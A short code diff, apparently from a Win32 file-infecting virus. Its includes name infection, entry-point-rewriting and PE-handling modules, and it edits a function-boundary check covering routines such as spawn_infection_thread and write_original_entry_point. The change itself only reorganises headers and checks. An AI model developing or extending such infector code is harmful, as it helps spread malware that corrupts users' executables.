@@ -5,16 +5,16 @@
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
-#include "disasm.h"
+#include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
 #include "infection_thread.h"
+#include "memory.h"
 #include "oep.h"
 #include "pe.h"
 #include "process_info.h"
 #include "string_generator.h"
 #include "utility.h"
-#include "memory.h"
 
 #ifdef _WIN64
 #error "Currently only support Win32"
@@ -53,9 +53,7 @@ int main(int argc, char **argv) {
 static uint8_t check_functions(void) {
     return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
            IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
-           IN_BOUNDARIES(parse_instruction) &&
-           IN_BOUNDARIES(next_instruction) && IN_BOUNDARIES(checksum) &&
-           IN_BOUNDARIES(spawn_infection_thread) &&
+           IN_BOUNDARIES(checksum) && IN_BOUNDARIES(spawn_infection_thread) &&
            IN_BOUNDARIES(get_original_entry_point) &&
            IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
            IN_BOUNDARIES(align_value) && IN_BOUNDARIES(get_nt_header) &&
